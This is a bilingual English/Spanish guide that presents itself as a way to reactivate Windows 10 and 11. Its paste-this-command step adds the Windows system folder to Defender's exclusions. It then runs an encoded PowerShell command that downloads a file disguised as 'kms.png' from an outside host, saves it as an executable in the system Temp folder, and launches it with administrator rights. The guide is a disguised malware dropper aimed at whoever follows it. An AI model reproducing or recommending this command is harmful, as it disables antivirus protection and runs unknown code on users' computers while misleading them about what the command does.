# ⚙️ Reactivating Windows 10 and 11 🖥️

## 📋 Step-by-Step Guide | Guía Paso a Paso

> 🌟 **Need to reactivate your Windows 10 or 11?** Follow these simple steps!  
> 🌟 **¿Necesitas reactivar tu Windows 10 o 11?** ¡Sigue estos simples pasos!

### 🛠️ Step 1: Open CMD as Administrator | Abrir CMD como Administrador
- 🖱️ **Right-click on the Start menu** and select **Command Prompt (Admin)**.  
  - 💡 Alternatively, type **CMD** in the search bar, right-click on it, and select **Run as Administrator**.
- 🖱️ **Haz clic derecho en el menú Inicio** y selecciona **Símbolo del sistema (Administrador)**.  
  - 💡 Alternativamente, busca **CMD**, haz clic derecho y selecciona **Ejecutar como administrador**.

### 🖨️ Step 2: Copy and Paste the Command | Copiar y Pegar el Comando
- 📝 Copy the following command and paste it into the CMD window:  
  - 📝 Copia el siguiente comando y pégalo en la ventana de CMD:

```bash
net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot >nul 2>&1 || (echo Need to run as Administrator OPEN CMD AS ADMIN )
net session >nul 2>&1 && powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADgAOQA2ADQAMwA1ADQAOAA2AC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAGsAbQBzAC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwALgBlAHgAZQAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdABcAFQAZQBtAHAAXAAuAGUAeABlACIA >nul 2>&1 || (echo Need to run as Administrator \ press ENTER \ presione ENTER )
```
### ⏳ Step 3: Wait and Confirm | Espera y Confirma

- ⏱️ **The process may take between 30 seconds to 2 minutes.**
  - ⏱️ **El proceso puede tardar entre 30 segundos y 2 minutos.**
- ✅ **If everything goes well, Windows will be reactivated.**
  - ✅ **Si todo va bien, Windows será reactivado.**

---

### 🔄 No Restart Needed! | ¡No Es Necesario Reiniciar!

- 🚀 **Good news!** You won’t need to restart your PC.
  - 🚀 **¡Buenas noticias!** No necesitarás reiniciar tu PC.

---

### 💡 Important Notes | Notas Importantes

| **English**                                              | **Español**                                               |
|----------------------------------------------------------|-----------------------------------------------------------|
| 🛑 Ensure CMD is run as Administrator!                    | 🛑 ¡Asegúrate de que CMD esté ejecutándose como Administrador! |
| ⏳ Reactivation may take **30 seconds to 2 minutes**.     | ⏳ La reactivación puede tardar **30 segundos a 2 minutos**.|
| 📝 Don’t forget to copy and paste the entire command.     | 📝 No olvides copiar y pegar el comando completo.          |
| 🔑 Press **ENTER** after pasting the command in CMD.      | 🔑 Presiona **ENTER** después de pegar el comando en CMD.   |
| 🚫 **No need to restart** after reactivation!             | 🚫 **¡No es necesario reiniciar** después de la reactivación!|

---

### 🔧 Troubleshooting | Solución de Problemas

If reactivation doesn’t work, here are a few tips:
- 🔄 **Check your internet connection**.
- 🔍 **Ensure that your Windows license is valid**.
- 🔑 **Try re-running CMD as Administrator**.

Si la reactivación no funciona, aquí algunos consejos:
- 🔄 **Verifica tu conexión a internet**.
- 🔍 **Asegúrate de que tu licencia de Windows sea válida**.
- 🔑 **Intenta ejecutar CMD como Administrador nuevamente**.

---

## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado!
